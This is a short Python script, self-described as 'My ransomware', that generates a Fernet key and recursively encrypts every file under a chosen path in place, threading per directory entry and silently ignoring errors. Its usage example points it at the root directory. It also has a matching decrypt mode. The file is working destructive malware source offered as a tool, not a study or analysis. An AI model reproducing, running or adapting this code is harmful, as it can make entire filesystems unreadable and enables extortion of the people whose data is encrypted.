import argparse
from cryptography.fernet import Fernet
import os
import textwrap
import threading
import platform

PLATFORM = platform.system()

if PLATFORM in ["linux", "linux2", "darwin", "Linux"]:
    LIMITER = "/"
else:
    LIMITER = "\\"

class RansomWare:
    def __init__(self, args):
        self.args = args

    def run(self):
        if self.args.generate:
            key = Fernet.generate_key()

            with open(self.args.key, 'wb') as filekey:
                filekey.write(key)
        else:
            if self.args.decrypt:
                self.decrypt(self.args.path)
            else:
                self.crypt(self.args.path)

    def crypt(self, elt):
        '''
        Crypt all the file recursively at the path elt
        :param elt: the path of the file or the directory where start the cryptography
        '''
        if os.path.isfile(elt):
            try:
                with open(self.args.key, 'rb') as filekey:
                    key = filekey.read()

                fernet = Fernet(key)

                with open(elt, 'rb') as file:
                    original = file.read()

                encrypted = fernet.encrypt(original)

                with open(elt, 'wb') as encrypted_file:
                    encrypted_file.write(encrypted)
            except Exception as e:
                pass
            
        else:
            for filename in os.listdir(elt):
                client_thread = threading.Thread(
                    target=self.crypt, args=(elt+LIMITER+filename,)
                )
                client_thread.start()

    def decrypt(self, elt):
        '''
        Decrypt all the file recursively at the path elt
        :param elt: the path of the file or the directory where start the cryptography
        '''
        if os.path.isfile(elt):
            with open(self.args.key, 'rb') as filekey:
                key = filekey.read()

            fernet = Fernet(key)

            with open(elt, 'rb') as enc_file:
                encrypted = enc_file.read()

            decrypted = fernet.decrypt(encrypted)

            with open(elt, 'wb') as dec_file:
                dec_file.write(decrypted)

        else:
            for filename in os.listdir(elt):
                client_thread = threading.Thread(
                    target=self.decrypt, args=(elt+LIMITER+filename,)
                )
                client_thread.start()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='My ransomware',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''Example:
                                        ramsomware.py -k file.key -a / # Crypt the directory / with the key key and AES
                                        ransomware.py -k file.key -a / -d # Decrypt the directory / with the key key
                                        ransomware.py -k -g # Generate a key
                                     '''))
    parser.add_argument('-k', '--key', help='the key to crypt or decrypt')
    parser.add_argument('-d', '--decrypt', action='store_true', help='decrypt')
    parser.add_argument('-a', '--path', help='the file or the directory to crypt')
    parser.add_argument('-g', '--generate', action='store_true', help='generate a key')

    args = parser.parse_args()
    rw = RansomWare(args)
    rw.run()
